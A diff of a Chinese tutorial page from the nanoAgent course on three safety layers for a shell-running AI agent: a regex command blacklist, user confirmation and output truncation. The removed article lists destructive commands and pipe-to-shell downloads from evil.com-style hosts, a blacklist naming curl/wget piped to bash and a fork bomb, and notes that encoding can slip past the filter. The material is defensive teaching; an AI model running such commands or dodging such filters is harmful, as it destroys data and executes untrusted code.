@@ -3,19 +3,19 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>07. 三道安全防线 | 从零开始理解 Agent</title>
-  <meta name="description" content="最后收束到真实落地最不能跳过的一层：权限、确认、黑名单和风险控制。">
+  <title>07. 三道安全防线｜1 小时实战分享课</title>
+  <meta name="description" content="最后一讲只讲 Agent 真正落地时最不能省的边界：危险命令拦截、人工确认、超长输出截断。">
   <meta name="theme-color" content="#1f2430">
   <link rel="canonical" href="https://githubxsy.github.io/nanoAgent/safety.html">
   <meta property="og:locale" content="zh_CN">
   <meta property="og:type" content="article">
   <meta property="og:site_name" content="从零开始理解 Agent">
-  <meta property="og:title" content="07. 三道安全防线 | 从零开始理解 Agent">
-  <meta property="og:description" content="最后收束到真实落地最不能跳过的一层：权限、确认、黑名单和风险控制。">
+  <meta property="og:title" content="07. 三道安全防线｜1 小时实战分享课">
+  <meta property="og:description" content="最后一讲只讲 Agent 真正落地时最不能省的边界：危险命令拦截、人工确认、超长输出截断。">
   <meta property="og:url" content="https://githubxsy.github.io/nanoAgent/safety.html">
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="07. 三道安全防线 | 从零开始理解 Agent">
-  <meta name="twitter:description" content="最后收束到真实落地最不能跳过的一层：权限、确认、黑名单和风险控制。">
+  <meta name="twitter:title" content="07. 三道安全防线｜1 小时实战分享课">
+  <meta name="twitter:description" content="最后一讲只讲 Agent 真正落地时最不能省的边界：危险命令拦截、人工确认、超长输出截断。">
   <link rel="stylesheet" href="assets/style.css">
   <script defer src="assets/site.js"></script>
 </head>
@@ -29,9 +29,8 @@
         <span class="brand-text">从零开始理解 Agent</span>
       </a>
       <nav class="top-nav">
-        <a href="index.html#path">学习路径</a>
-        <a href="index.html#map">能力地图</a>
-        <a href="index.html#chapters">全部章节</a>
+        <a href="index.html#agenda">课程流程</a>
+        <a href="index.html#lessons">七讲讲义</a>
         <a href="https://github.com/GitHubxsy/nanoAgent">GitHub</a>
       </nav>
     </header>
@@ -39,13 +38,13 @@
     <main class="article-layout" id="main-content">
       <aside class="article-sidebar">
         <div class="sidebar-card">
-          <p class="eyebrow">第 07 讲</p>
+          <p class="eyebrow">第 07 讲 · 能力关进笼子</p>
           <h2 class="lesson-title">三道安全防线</h2>
-          <p>最后收束到真实落地最不能跳过的一层：权限、确认、黑名单和风险控制。</p>
+          <p>最后一讲只讲 Agent 真正落地时最不能省的边界：危险命令拦截、人工确认、超长输出截断。</p>
           <div class="chip-row">
-            <span class="chip">关键</span>
-            <span class="chip">15 分钟</span>
+            <span class="chip">8 分钟</span>
             <span class="chip">288 行代码</span>
+            <span class="chip">黑名单 + 人工确认 + 输出截断</span>
           </div>
         </div>
 
@@ -55,73 +54,52 @@
             <a class="chapter-rail-link" href="essence.html">
               <span class="course-step">第 01 讲</span>
               <strong>底层原理，只有 100 行</strong>
-              <small>本质 · Agent = LLM + 工具 + 循环</small>
+              <small>最小闭环 · LLM + 工具 + 循环</small>
             </a>
             
             <a class="chapter-rail-link" href="memory.html">
               <span class="course-step">第 02 讲</span>
               <strong>记忆与规划</strong>
-              <small>记忆 · 持久记忆 + Plan-then-Execute</small>
+              <small>多步任务 · 持久记忆 + Plan-then-Execute</small>
             </a>
             
             <a class="chapter-rail-link" href="skills-mcp.html">
               <span class="course-step">第 03 讲</span>
               <strong>Rules、Skills 与 MCP</strong>
-              <small>扩展 · 行为约束 + 外部能力接入</small>
+              <small>工程扩展 · 规则 + 技能 + 外部工具</small>
             </a>
             
             <a class="chapter-rail-link" href="subagent.html">
               <span class="course-step">第 04 讲</span>
               <strong>SubAgent 子智能体</strong>
-              <small>分工 · 委派 + 上下文隔离</small>
+              <small>任务委派 · 独立上下文 + 角色委派</small>
             </a>
             
             <a class="chapter-rail-link" href="teams.html">
               <span class="course-step">第 05 讲</span>
               <strong>多智能体团队协作</strong>
-              <small>协作 · 角色化协作 + 生命周期管理</small>
+              <small>团队编排 · 持久 Agent + 通信通道</small>
             </a>
             
             <a class="chapter-rail-link" href="compact.html">
               <span class="course-step">第 06 讲</span>
               <strong>上下文压缩</strong>
-              <small>压缩 · Summary + Recent Window</small>
+              <small>长任务生存 · 摘要旧消息，保留最近窗口</small>
             </a>
             
             <a class="chapter-rail-link is-current" href="safety.html">
               <span class="course-step">第 07 讲</span>
               <strong>三道安全防线</strong>
-              <small>安全 · 风险隔离 + 人机边界</small>
+              <small>上线边界 · 黑名单 + 人工确认 + 输出截断</small>
             </a>
             </div>
         </div>
 
         <div class="sidebar-card">
-          <h2>本章焦点</h2>
-          <p class="focus-line">风险隔离 + 人机边界</p>
-          <p>前六篇我们一直在给 Agent 加能力。但有一个危险我们一直视而不见：**Agent 手里有一把没有保险的枪。**</p>
-        </div>
-
-        <div class="sidebar-card">
-          <h2>目录</h2>
-          <nav class="toc"><a class="toc-link level-2" href="#一agent-的安全问题到底有多严重">一、Agent 的安全问题到底有多严重？</a>
-<a class="toc-link level-2" href="#二三道防线的设计思路">二、三道防线的设计思路</a>
-<a class="toc-link level-2" href="#三防线-1命令黑名单">三、防线 1：命令黑名单</a>
-<a class="toc-link level-3" href="#黑名单能拦住所有危险命令吗">黑名单能拦住所有危险命令吗？</a>
-<a class="toc-link level-2" href="#四防线-2用户确认">四、防线 2：用户确认</a>
-<a class="toc-link level-3" href="#所有工具都需要确认吗">所有工具都需要确认吗？</a>
-<a class="toc-link level-2" href="#五防线-3输出截断">五、防线 3：输出截断</a>
-<a class="toc-link level-2" href="#六三道防线在-execute_bash-中的串联">六、三道防线在 execute_bash 中的串联</a>
-<a class="toc-link level-2" href="#七实际运行效果">七、实际运行效果</a>
-<a class="toc-link level-2" href="#八nanoagent-vs-生产级安全方案">八、nanoAgent vs 生产级安全方案</a>
-<a class="toc-link level-2" href="#九进化方向从硬编码到-hook-管道">九、进化方向：从硬编码到 Hook 管道</a>
-<a class="toc-link level-2" href="#十系列收官">十、系列收官</a></nav>
-        </div>
-
-        <div class="sidebar-card">
-          <h2>源码入口</h2>
-          <a class="source-link" href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/07-safety/agent-safe.md">查看 GitHub 原始文章</a>
-          <a class="source-link" href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/07-safety/agent-safe.py">查看 GitHub 示例代码</a>
+          <h2>课堂目录</h2>
+          <nav class="toc">
+            <a class="toc-link" href="#goals">这节课学生要拿走什么</a><a class="toc-link" href="#demo">现场演示</a><a class="toc-link" href="#practice">课堂练习</a><a class="toc-link" href="#code">关键代码</a><a class="toc-link" href="#talk">讲课只讲这 3 件事</a><a class="toc-link" href="#pitfalls">容易踩坑</a><a class="toc-link" href="#extend">课后延伸</a>
+          </nav>
         </div>
       </aside>
 
@@ -130,362 +108,201 @@
           <div class="breadcrumbs">
             <a href="index.html">课程首页</a>
             <span>/</span>
-            <a href="index.html#chapters">章节目录</a>
+            <a href="index.html#lessons">课堂版讲义</a>
             <span>/</span>
             <span>第 07 讲</span>
           </div>
-          <p class="eyebrow">Agent Tutorial</p>
+          <p class="eyebrow">1 小时实战分享课</p>
           <h1>07. 三道安全防线</h1>
-          <p class="lead">最后收束到真实落地最不能跳过的一层：权限、确认、黑名单和风险控制。</p>
-          <div class="tag-row"><span class="tag">Safety</span><span class="tag">Permissions</span><span class="tag">Guardrails</span></div>
+          <p class="lead">最后一讲只讲 Agent 真正落地时最不能省的边界：危险命令拦截、人工确认、超长输出截断。</p>
+          <div class="tag-row"><span class="tag">Safety</span><span class="tag">Approval</span><span class="tag">Guardrails</span></div>
           <div class="hero-actions">
-            <a class="primary-btn" href="index.html#chapters">返回课程首页</a>
-            <a class="secondary-btn" href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/07-safety/agent-safe.md">查看 GitHub 原文</a>
+            <a class="primary-btn" href="index.html#lessons">返回课程首页</a>
+            <a class="secondary-btn" href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/07-safety/agent-safe.md">完整原文</a>
           </div>
         </section>
 
-        <section class="content-card markdown-body">
-          <blockquote><p><strong>「从零开始理解 Agent」系列</strong> —— 从一个极简开源项目 <a href="https://github.com/GitHubxsy/nanoAgent">nanoAgent</a> 出发，逐层拆解 OpenClaw / Claude Code 等 AI Agent 背后的全部核心概念。</p><ul><li><a href="essence.html">第一篇：底层原理，只有 100 行</a> —— 工具 + 循环</li><li><a href="memory.html">第二篇：记忆与规划</a> —— 182 行</li><li><a href="skills-mcp.html">第三篇：Rules、Skills 与 MCP</a> —— 265 行</li><li><a href="subagent.html">第四篇：SubAgent 子智能体</a> —— 192 行</li><li><a href="teams.html">第五篇：多智能体协作与编排</a> —— 270 行</li><li><a href="compact.html">第六篇：上下文压缩</a> —— 169 行</li><li><strong>第七篇：安全与权限控制</strong>（本文）—— 219 行</li></ul></blockquote>
-<p>前六篇我们一直在给 Agent 加能力。但有一个危险我们一直视而不见：<strong>Agent 手里有一把没有保险的枪。</strong></p>
-<p>回忆第一篇中的 <code>execute_bash</code> 工具——它可以执行任意 shell 命令。任意。包括 <code>rm -rf /</code>、<code>mkfs.ext4 /dev/sda</code>、<code>curl http://evil.com | bash</code>。LLM 不是完美的，它有可能因为理解错误、幻觉、或者 prompt 注入而执行危险操作。</p>
-<p>这不是理论风险。只要你让 Agent 干过真正的活，一定遇到过它试图做一些你没预料到的事情。</p>
-<p>今天我们回到 agent-essence.py 的基础上，加上三道安全防线，让 Agent 从&quot;裸奔&quot;变成&quot;有保险的&quot;。</p>
-<hr>
-<h2 id="一agent-的安全问题到底有多严重">一、Agent 的安全问题到底有多严重？</h2>
-<p>先看几个 Agent 可能执行的命令：</p>
-<pre class="code-block"><code class="language-bash"># LLM 想&quot;清理临时文件&quot;，但路径搞错了
-rm -rf /
+        <section class="lesson-section" id="goals">
+          <div class="lesson-section-head">
+            <p class="eyebrow">Goal</p>
+            <h2>这节课学生要拿走什么</h2>
+          </div>
+          <ul class="lesson-list"><li>能说清三道防线分别解决什么问题。</li><li>知道为什么不能把“是否安全”完全外包给模型自己判断。</li><li>理解安全与上下文控制其实是同一件工程责任的两面。</li></ul>
+        </section>
 
-# LLM 想&quot;重置数据库&quot;，结果格式化了磁盘
-mkfs.ext4 /dev/sda1
+        <section class="lesson-section" id="demo">
+          <div class="lesson-section-head">
+            <p class="eyebrow">Live Demo</p>
+            <h2>现场演示</h2>
+            <p>让学生形成一个很强的工程直觉：能力越强，越要在人机边界处加护栏。</p>
+          </div>
+          <div class="demo-box">
+            <p class="lesson-index">演示命令</p>
+            <pre class="demo-command"><code>python agent/07-safety/agent-safe.py &quot;列出当前目录的文件&quot;</code></pre>
+            <ul class="lesson-list"><li>普通命令会先弹确认，再执行。</li><li>危险命令会在黑名单阶段直接被拦下。</li><li>超长输出会被截断，顺带呼应上一讲的上下文控制问题。</li></ul>
+          </div>
+        </section>
 
-# LLM 在网上&quot;找到了一个解决方案&quot;
-curl http://malicious.com/script.sh | bash
+        <section class="lesson-section" id="practice">
+          <div class="lesson-section-head">
+            <p class="eyebrow">Practice</p>
+            <h2>课堂练习</h2>
+            <p>把安全讲成‘让 Agent 能上线’的最后门槛，听众会更容易记住。</p>
+          </div>
+          <ol class="lesson-steps"><li>给 `DANGEROUS_PATTERNS` 自己再补一条高危命令规则。</li><li>把 `read_file` 改成只允许读取项目目录，做一个最小白名单。</li><li>故意读取一个超长文件，观察截断提示如何返回给模型。</li></ol>
+        </section>
 
-# LLM 想&quot;修复权限问题&quot;
-chmod 777 /
+        <section class="lesson-section" id="code">
+          <div class="lesson-section-head">
+            <p class="eyebrow">Code Focus</p>
+            <h2>关键代码</h2>
+          </div>
+          <div class="code-group">
+            
+            <article class="code-card">
+              <div class="code-card-head">
+                <div>
+                  <p class="lesson-index">危险命令黑名单与确认机制</p>
+                  <h3>先让学生明白黑名单和确认框各拦哪一层风险。</h3>
+                </div>
+                <a class="source-link" href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/07-safety/agent-safe.py#L49-L107">看 GitHub 行号</a>
+              </div>
+              <pre class="code-block"><code class="language-python">  49 def is_dangerous(command):
+  50     &quot;&quot;&quot;检查命令是否匹配黑名单&quot;&quot;&quot;
+  51     for pattern in DANGEROUS_PATTERNS:
+  52         if re.search(pattern, command):
+  53             return True, pattern
+  54     return False, None
+  55 
+  56 
+  57 # ==================== 安全防线 2: 用户确认 ====================
+  58 #
+  59 # 命令没有被黑名单拦截，不代表它是安全的。
+  60 # 所有 bash 命令在执行前都让用户过目确认。
+  61 # 类似 OpenClaw / Claude Code 中的 &quot;Allow / Deny&quot; 机制。
+  62 
+  63 
+  64 def ask_user_confirmation(tool_name, args):
+  65     &quot;&quot;&quot;执行前询问用户确认&quot;&quot;&quot;
+  66     if AUTO_APPROVE:
+  67         return True
+  68 
+  69     print(f&quot;\n┌─ 确认执行 ─────────────────────────────&quot;)
+  70     print(f&quot;│ 工具: {tool_name}&quot;)
+  71     for key, value in args.items():
+  72         display = str(value)[:200]
+  73         print(f&quot;│ {key}: {display}&quot;)
+  74     print(f&quot;└────────────────────────────────────────&quot;)
+  75 
+  76     while True:
+  77         answer = input(&quot;[Y]执行 / [N]跳过 / [Q]终止 Agent &gt; &quot;).strip().lower()
+  78         if answer in (&quot;y&quot;, &quot;yes&quot;, &quot;&quot;):
+  79             return True
+  80         elif answer in (&quot;n&quot;, &quot;no&quot;):
+  81             return False
+  82         elif answer in (&quot;q&quot;, &quot;quit&quot;):
+  83             print(&quot;用户终止了 Agent。&quot;)
+  84             sys.exit(0)
+  85         else:
+  86             print(&quot;请输入 Y/N/Q&quot;)
+  87 
+  88 
+  89 # ==================== 安全防线 3: 输出截断 ====================
+  90 #
+  91 # 工具返回的结果可能巨大（比如 cat 一个 10000 行的文件）。
+  92 # 不截断的话会迅速撑爆 context window（第六篇讲的问题）。
+  93 # 截断是压缩之外的另一道防线：从源头控制输入大小。
+  94 
+  95 MAX_OUTPUT_LENGTH = 5000  # 字符数
+  96 
+  97 
+  98 def truncate_output(text):
+  99     &quot;&quot;&quot;超长输出截断，保留首尾&quot;&quot;&quot;
+ 100     if len(text) &lt;= MAX_OUTPUT_LENGTH:
+ 101         return text
+ 102     half = MAX_OUTPUT_LENGTH // 2
+ 103     return (
+ 104         text[:half]
+ 105         + f&quot;\n\n... [输出过长，已截断。原始 {len(text)} 字符，保留首尾各 {half} 字符] ...\n\n&quot;
+ 106         + text[-half:]
+ 107     )</code></pre>
+            </article>
+            
+            <article class="code-card">
+              <div class="code-card-head">
+                <div>
+                  <p class="lesson-index">安全版 execute_bash</p>
+                  <h3>三道防线是如何串起来的，这段函数最清楚。</h3>
+                </div>
+                <a class="source-link" href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/07-safety/agent-safe.py#L162-L186">看 GitHub 行号</a>
+              </div>
+              <pre class="code-block"><code class="language-python"> 162 def execute_bash(command):
+ 163     # 防线 1: 黑名单检查
+ 164     dangerous, pattern = is_dangerous(command)
+ 165     if dangerous:
+ 166         msg = f&quot;🚫 命令被拦截（匹配危险模式: {pattern}）: {command}&quot;
+ 167         print(f&quot;  {msg}&quot;)
+ 168         return msg
+ 169 
+ 170     # 防线 2: 用户确认
+ 171     if not ask_user_confirmation(&quot;execute_bash&quot;, {&quot;command&quot;: command}):
+ 172         return &quot;用户跳过了此命令。&quot;
+ 173 
+ 174     # 执行
+ 175     try:
+ 176         result = subprocess.run(
+ 177             command, shell=True, capture_output=True, text=True, timeout=30
+ 178         )
+ 179         output = result.stdout + result.stderr
+ 180     except subprocess.TimeoutExpired:
+ 181         output = &quot;Error: 命令执行超时（30秒）&quot;
+ 182     except Exception as e:
+ 183         output = f&quot;Error: {str(e)}&quot;
+ 184 
+ 185     # 防线 3: 输出截断
+ 186     return truncate_output(output)</code></pre>
+            </article>
+            
+          </div>
+        </section>
 
-# LLM 陷入循环，输出了一个 10MB 的文件内容，撑爆 context window
-cat /var/log/syslog</code></pre>
-<p>这些不是 LLM 故意为之，而是它在&quot;尽力完成任务&quot;的过程中可能走错的路。LLM 不理解&quot;删除根目录&quot;的后果——对它来说，<code>rm</code> 只是一个&quot;删除文件的工具&quot;。</p>
-<p>OpenClaw 和 Claude Code 是怎么解决的？它们都有一个共同的设计：<strong>每次执行命令前，弹出确认框让用户决定 Allow 还是 Deny。</strong> 这就是人机协作的安全边界。</p>
-<hr>
-<h2 id="二三道防线的设计思路">二、三道防线的设计思路</h2>
-<p>我们的安全方案由三道防线组成，由外到内逐层过滤：</p>
-<pre class="code-block"><code class="language-text">LLM 输出一条命令
-  │
-  ▼
-防线 1: 命令黑名单
-  │ &quot;rm -rf /&quot; → 🚫 直接拦截，不问用户
-  │ &quot;ls -la&quot;   → ✅ 通过
-  ▼
-防线 2: 用户确认
-  │ &quot;find . -name &#x27;*.py&#x27;&quot; → 用户看到后按 Y 放行
-  │                        → 用户按 N 跳过
-  │                        → 用户按 Q 终止 Agent
-  ▼
-防线 3: 输出截断
-  │ 命令输出 10000 行 → 截断为首尾各 2500 字符
-  │ 命令输出 10 行    → 原样返回
-  ▼
-结果返回给 LLM</code></pre>
-<p>三道防线各管一层：黑名单管&quot;绝对不能做的&quot;，用户确认管&quot;需要人类判断的&quot;，输出截断管&quot;结果太大的&quot;。</p>
-<hr>
-<h2 id="三防线-1命令黑名单">三、防线 1：命令黑名单</h2>
-<pre class="code-block"><code class="language-python">DANGEROUS_PATTERNS = [
-    r&#x27;\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+|.*--no-preserve-root)&#x27;,  # rm -rf
-    r&#x27;\brm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+)?/&#x27;,                     # rm /
-    r&#x27;\bmkfs\b&#x27;,                    # 格式化磁盘
-    r&#x27;\bdd\s+.*of\s*=\s*/dev/&#x27;,     # 覆写磁盘
-    r&#x27;&gt;\s*/dev/sd[a-z]&#x27;,            # 重定向到磁盘设备
-    r&#x27;\bchmod\s+(-R\s+)?777\s+/&#x27;,   # chmod 777 /
-    r&#x27;:\(\)\s*\{&#x27;,                  # fork bomb
-    r&#x27;\bcurl\b.*\|\s*(ba)?sh&#x27;,      # curl | bash
-    r&#x27;\bwget\b.*\|\s*(ba)?sh&#x27;,      # wget | bash
-    r&#x27;\bshutdown\b&#x27;,                # 关机
-    r&#x27;\breboot\b&#x27;,                  # 重启
-]
+        <section class="lesson-section" id="talk">
+          <div class="lesson-section-head">
+            <p class="eyebrow">Talk Track</p>
+            <h2>讲课只讲这 3 件事</h2>
+          </div>
+          <ul class="lesson-list"><li>黑名单负责挡住已知高危动作，人工确认负责最后边界。</li><li>输出截断既是安全问题，也是稳定性问题。</li><li>真正可用的 Agent 一定要允许用户拒绝某一步。</li></ul>
+        </section>
 
-def is_dangerous(command):
-    for pattern in DANGEROUS_PATTERNS:
-        if re.search(pattern, command):
-            return True, pattern
-    return False, None</code></pre>
-<p>这是最简单粗暴但最可靠的防线。不需要 AI 判断，不需要语义理解，<strong>纯正则匹配</strong>。<code>rm -rf /</code> 命中第一条规则，直接拦截，连用户确认的机会都不给。</p>
-<p>在 <code>execute_bash</code> 函数的最开头调用：</p>
-<pre class="code-block"><code class="language-python">def execute_bash(command):
-    dangerous, pattern = is_dangerous(command)
-    if dangerous:
-        return f&quot;🚫 命令被拦截（匹配危险模式: {pattern}）: {command}&quot;
-    # ... 继续执行</code></pre>
-<p>LLM 会收到&quot;命令被拦截&quot;的返回信息，然后它可以尝试换一种安全的方式来完成任务。</p>
-<h3 id="黑名单能拦住所有危险命令吗">黑名单能拦住所有危险命令吗？</h3>
-<p>不能。黑名单只能拦住<strong>已知的危险模式</strong>。一个精心构造的命令（比如用变量拼接、base64 编码）可以绕过正则匹配。所以黑名单不是唯一防线——它只是第一道过滤，挡住最明显的危险操作。真正的兜底靠第二道防线。</p>
-<hr>
-<h2 id="四防线-2用户确认">四、防线 2：用户确认</h2>
-<pre class="code-block"><code class="language-python">def ask_user_confirmation(tool_name, args):
-    if AUTO_APPROVE:
-        return True
+        <section class="lesson-section" id="pitfalls">
+          <div class="lesson-section-head">
+            <p class="eyebrow">Pitfalls</p>
+            <h2>容易踩坑</h2>
+          </div>
+          <ul class="lesson-list"><li>只靠黑名单是不够的，绕过方式永远存在。</li><li>所有动作都确认会严重伤体验，要做分级策略。</li><li>`--auto` 只能在你完全信任的隔离环境里用。</li></ul>
+        </section>
 
-    print(f&quot;\n┌─ 确认执行 ─────────────────────────────&quot;)
-    print(f&quot;│ 工具: {tool_name}&quot;)
-    for key, value in args.items():
-        print(f&quot;│ {key}: {str(value)[:200]}&quot;)
-    print(f&quot;└────────────────────────────────────────&quot;)
-
-    while True:
-        answer = input(&quot;[Y]执行 / [N]跳过 / [Q]终止 Agent &gt; &quot;).strip().lower()
-        if answer in (&#x27;y&#x27;, &#x27;yes&#x27;, &#x27;&#x27;):
-            return True
-        elif answer in (&#x27;n&#x27;, &#x27;no&#x27;):
-            return False
-        elif answer in (&#x27;q&#x27;, &#x27;quit&#x27;):
-            sys.exit(0)</code></pre>
-<p>通过了黑名单的命令，在执行前还要过人类这一关。用户看到完整的命令内容后，有三个选择：</p>
-<div class="table-wrap"><table>
-<thead><tr>
-<th>输入</th>
-<th>效果</th>
-</tr></thead>
-<tbody>
-<tr>
-<td><code>Y</code> 或回车</td>
-<td>放行，执行这条命令</td>
-</tr>
-<tr>
-<td><code>N</code></td>
-<td>跳过，返回&quot;用户跳过了此命令&quot;给 LLM</td>
-</tr>
-<tr>
-<td><code>Q</code></td>
-<td>直接终止整个 Agent</td>
-</tr>
-</tbody>
-</table></div>
-<p>这就是 OpenClaw / Claude Code 中 &quot;Allow / Deny&quot; 机制的极简版。</p>
-<h3 id="所有工具都需要确认吗">所有工具都需要确认吗？</h3>
-<p>在 <code>agent-safe.py</code> 中，三个工具（bash、read_file、write_file）都会触发确认。但在实际产品中，确认策略可以更精细：</p>
-<ul>
-<li><code>read_file</code> 通常是安全的——只读不写，可以默认放行</li>
-<li><code>write_file</code> 要看路径——写入项目目录内的放行，写入 <code>/etc/</code> 的要确认</li>
-<li><code>bash</code> 最危险——每次都确认，或者用白名单模式（只允许 <code>ls</code>、<code>grep</code>、<code>cat</code> 等安全命令免确认）</li>
-</ul>
-<p><code>--auto</code> 参数可以跳过所有确认，用于信任场景（比如在 Docker 容器里运行）。</p>
-<hr>
-<h2 id="五防线-3输出截断">五、防线 3：输出截断</h2>
-<pre class="code-block"><code class="language-python">MAX_OUTPUT_LENGTH = 5000
-
-def truncate_output(text):
-    if len(text) &lt;= MAX_OUTPUT_LENGTH:
-        return text
-    half = MAX_OUTPUT_LENGTH // 2
-    return (
-        text[:half]
-        + f&quot;\n\n... [输出过长，已截断。原始 {len(text)} 字符，保留首尾各 {half} 字符] ...\n\n&quot;
-        + text[-half:]
-    )</code></pre>
-<p>这道防线解决的不是&quot;命令危险&quot;的问题，而是&quot;结果太大&quot;的问题。</p>
-<p>想象 LLM 执行了 <code>cat /var/log/syslog</code>，返回了 10MB 的日志。这些内容会被追加到 <code>messages</code> 里，下一轮 API 调用就会因为 context window 超限而失败。第六篇讲的压缩是事后补救，输出截断是<strong>从源头控制</strong>。</p>
-<p>截断策略是保留首尾各一半——开头通常包含列标题或文件头部信息，结尾通常包含最新的内容或错误信息，中间的细节可以丢掉。</p>
-<hr>
-<h2 id="六三道防线在-execute_bash-中的串联">六、三道防线在 execute_bash 中的串联</h2>
-<pre class="code-block"><code class="language-python">def execute_bash(command):
-    # 防线 1: 黑名单
-    dangerous, pattern = is_dangerous(command)
-    if dangerous:
-        return f&quot;🚫 命令被拦截: {command}&quot;
-
-    # 防线 2: 用户确认
-    if not ask_user_confirmation(&quot;execute_bash&quot;, {&quot;command&quot;: command}):
-        return &quot;用户跳过了此命令。&quot;
-
-    # 执行
-    try:
-        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
-        output = result.stdout + result.stderr
-    except subprocess.TimeoutExpired:
-        output = &quot;Error: 命令执行超时（30秒）&quot;
-    except Exception as e:
-        output = f&quot;Error: {str(e)}&quot;
-
-    # 防线 3: 输出截断
-    return truncate_output(output)</code></pre>
-<p>三道防线在一个函数里依次串联：先过黑名单 → 再过用户确认 → 最后截断输出。每道防线都是独立的，拦住了就直接返回，不进入下一道。</p>
-<hr>
-<h2 id="七实际运行效果">七、实际运行效果</h2>
-<pre class="code-block"><code class="language-bash">$ python agent/07-safety/agent-safe.py &quot;清理 /tmp 下的所有文件&quot;</code></pre>
-<pre class="code-block"><code class="language-text">[Tool] execute_bash({&quot;command&quot;: &quot;rm -rf /tmp/*&quot;})
-  🚫 命令被拦截（匹配危险模式: rm -rf）: rm -rf /tmp/*
-
-（LLM 收到拦截信息后换了一种方式）
-
-[Tool] execute_bash({&quot;command&quot;: &quot;find /tmp -type f -delete&quot;})
-
-┌─ 确认执行 ─────────────────────────────
-│ 工具: execute_bash
-│ command: find /tmp -type f -delete
-└────────────────────────────────────────
-[Y]执行 / [N]跳过 / [Q]终止 Agent &gt; n
-
-（用户觉得不安全，跳过了）
-
-[Tool] execute_bash({&quot;command&quot;: &quot;ls /tmp&quot;})
-
-┌─ 确认执行 ─────────────────────────────
-│ 工具: execute_bash
-│ command: ls /tmp
-└────────────────────────────────────────
-[Y]执行 / [N]跳过 / [Q]终止 Agent &gt; y
-
-（用户放行，Agent 先看看 /tmp 里有什么再决定下一步）</code></pre>
-<p>注意 LLM 的行为：第一次 <code>rm -rf</code> 被拦截后，它尝试了 <code>find -delete</code>（绕过了黑名单但被用户拒绝），最后退而求其次先 <code>ls</code> 看看情况。<strong>Agent 在安全约束下会自适应调整策略</strong>——这正是把拦截信息返回给 LLM 的好处。</p>
-<hr>
-<h2 id="八nanoagent-vs-生产级安全方案">八、nanoAgent vs 生产级安全方案</h2>
-<div class="table-wrap"><table>
-<thead><tr>
-<th>维度</th>
-<th>agent-safe.py</th>
-<th>OpenClaw / Claude Code 等</th>
-</tr></thead>
-<tbody>
-<tr>
-<td>命令过滤</td>
-<td>正则黑名单</td>
-<td>更精细的分类：安全命令免确认、危险命令强制拦截、中间地带让用户选</td>
-</tr>
-<tr>
-<td>用户确认</td>
-<td>文本终端 Y/N</td>
-<td>图形化界面，支持 &quot;Always allow&quot; 记住选择</td>
-</tr>
-<tr>
-<td>执行隔离</td>
-<td>无</td>
-<td>Docker / 虚拟机沙箱，限制文件系统访问范围</td>
-</tr>
-<tr>
-<td>输出控制</td>
-<td>字符数截断</td>
-<td>基于 token 数精确控制，结合第六篇的压缩机制</td>
-</tr>
-<tr>
-<td>网络控制</td>
-<td>无</td>
-<td>限制可访问的域名、禁止下载执行脚本</td>
-</tr>
-</tbody>
-</table></div>
-<p>nanoAgent 的方案是&quot;最小可行安全&quot;——三道防线用不到 80 行代码实现，但已经覆盖了最常见的风险。生产环境在此基础上叠加沙箱隔离和更精细的策略。</p>
-<hr>
-<h2 id="九进化方向从硬编码到-hook-管道">九、进化方向：从硬编码到 Hook 管道</h2>
-<p>回头看一下 <code>execute_bash</code> 的代码结构：</p>
-<pre class="code-block"><code class="language-python">def execute_bash(command):
-    is_dangerous(command)           # 检查 1：黑名单
-    ask_user_confirmation(...)      # 检查 2：用户确认
-    result = subprocess.run(...)    # 实际执行
-    truncate_output(result)         # 后处理：截断</code></pre>
-<p>三道防线是<strong>硬编码</strong>在函数里的。想加一个新检查（比如&quot;记录所有命令到日志文件&quot;），就得改 <code>execute_bash</code> 的代码。想对 <code>read_file</code> 加同样的检查，又得再写一遍。</p>
-<p>生产级 Agent 框架会把这些检查抽象成 <strong>Hook（钩子）机制</strong>——一个可插拔的管道：</p>
-<pre class="code-block"><code class="language-python"># 定义 Hook 管道
-before_hooks = [check_blacklist, ask_confirmation, log_command]
-after_hooks  = [truncate_output, log_result]
-
-# 通用的工具执行函数
-def execute_tool(name, args):
-    # 执行前：依次过所有 before hook
-    for hook in before_hooks:
-        blocked, msg = hook(name, args)
-        if blocked:
-            return msg              # 任何一个 hook 可以拦截
-
-    # 实际执行
-    result = available_functions[name](**args)
-
-    # 执行后：依次过所有 after hook
-    for hook in after_hooks:
-        result = hook(name, result)
-
-    return result</code></pre>
-<p>这样做的好处：</p>
-<ul>
-<li><strong>可插拔</strong>：加新检查只需要往列表里 <code>append</code> 一个函数，不用改核心代码</li>
-<li><strong>可复用</strong>：同一套 Hook 对所有工具生效，不用每个工具各写一遍</li>
-<li><strong>可配置</strong>：不同场景挂不同的 Hook 组合（开发环境宽松、生产环境严格）</li>
-</ul>
-<p>本文的三道防线就是三个 Hook 的&quot;手动版&quot;。理解了硬编码版本，Hook 只是把 <code>if</code> 语句换成了 <code>for</code> 循环——从&quot;写死哪些检查&quot;变成&quot;注册哪些检查&quot;。</p>
-<hr>
-<h2 id="十系列收官">十、系列收官</h2>
-<p>七篇文章，从 100 行代码到完整的 Agent 认知体系：</p>
-<div class="table-wrap"><table>
-<thead><tr>
-<th>篇</th>
-<th>核心主题</th>
-<th>一句话</th>
-</tr></thead>
-<tbody>
-<tr>
-<td>一</td>
-<td>工具 + 循环</td>
-<td>Agent 的最小本质</td>
-</tr>
-<tr>
-<td>二</td>
-<td>记忆 + 规划</td>
-<td>记住过去，规划未来</td>
-</tr>
-<tr>
-<td>三</td>
-<td>Rules + Skills + MCP</td>
-<td>扩展知识与工具</td>
-</tr>
-<tr>
-<td>四</td>
-<td>SubAgent</td>
-<td>一次性临时工</td>
-</tr>
-<tr>
-<td>五</td>
-<td>Teams</td>
-<td>有记忆、有身份、能通信的正式团队</td>
-</tr>
-<tr>
-<td>六</td>
-<td>上下文压缩</td>
-<td>记住要点，忘掉细节</td>
-</tr>
-<tr>
-<td><strong>七</strong></td>
-<td><strong>安全与权限</strong></td>
